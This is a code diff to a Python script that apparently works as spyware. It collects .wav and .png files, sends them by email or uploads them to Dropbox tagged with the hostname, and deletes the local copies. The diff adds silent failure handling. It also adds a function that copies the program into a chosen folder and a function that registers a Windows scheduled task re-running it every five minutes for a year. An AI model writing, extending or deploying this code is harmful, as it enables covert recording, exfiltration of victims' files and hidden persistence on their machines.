@@ -1,5 +1,7 @@
 import os
+import shutil
 import smtplib
+import subprocess
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
@@ -48,23 +50,19 @@ def send_mail_with_attachment(
     return True
 
 
-def get_wav_and_png_files():
-    current_directory = os.getcwd()
-
+def get_wav_and_png_files(dest_folder):
     wav_and_png_files = []
-    for filename in os.listdir(current_directory):
+    for filename in os.listdir(dest_folder):
         if filename.endswith(".wav") or filename.endswith(".png"):
             wav_and_png_files.append(filename)
 
     return wav_and_png_files
 
 
-def delete_wav_and_png_files():
-    current_directory = os.getcwd()
-
-    for filename in os.listdir(current_directory):
+def delete_wav_and_png_files(dest_folder):
+    for filename in os.listdir(dest_folder):
         if filename.endswith(".wav") or filename.endswith(".png"):
-            file_path = os.path.join(current_directory, filename)
+            file_path = os.path.join(dest_folder, filename)
             os.remove(file_path)
 
 
@@ -84,5 +82,38 @@ def upload_to_dropbox(hostname, dbx, wav_and_png_files):
         file_path = os.path.join(os.getcwd(), file_name)
         destination_path = f"/{hostname}_{file_name}"
 
-        with open(file_path, "rb") as f:
-            dbx.files_upload(f.read(), destination_path)
+        try:
+            with open(file_path, "rb") as f:
+                dbx.files_upload(f.read(), destination_path)
+        except (dbx.exceptions.ApiError, FileNotFoundError, Exception):
+            return
+
+
+
+def create_scheduled_task(executable_path, task_name):
+    check_task_command = f'if (Get-ScheduledTask -TaskName "{task_name}" -ErrorAction SilentlyContinue) {{ exit 1 }} else {{ exit 0 }}'
+
+    task_exists = subprocess.run(
+        ["powershell", "-Command", check_task_command], capture_output=True, text=True
+    )
+
+    if task_exists.returncode == 1:
+        return
+    else:
+        create_task_command = f"""
+        $action = New-ScheduledTaskAction -Execute '{executable_path}'
+        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 365)
+        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "{task_name}" -Description "Esegue il processo custom ogni 5 minuti"
+        """
+
+        subprocess.run(["powershell", "-Command", create_task_command], check=True)
+
+
+def save_program_in_location(src_file, dest_folder):
+    if not os.path.exists(dest_folder):
+        os.makedirs(dest_folder)
+
+    dest_file = os.path.join(dest_folder, os.path.basename(src_file))
+    shutil.copy(src_file, dest_file)
+
+    return dest_file
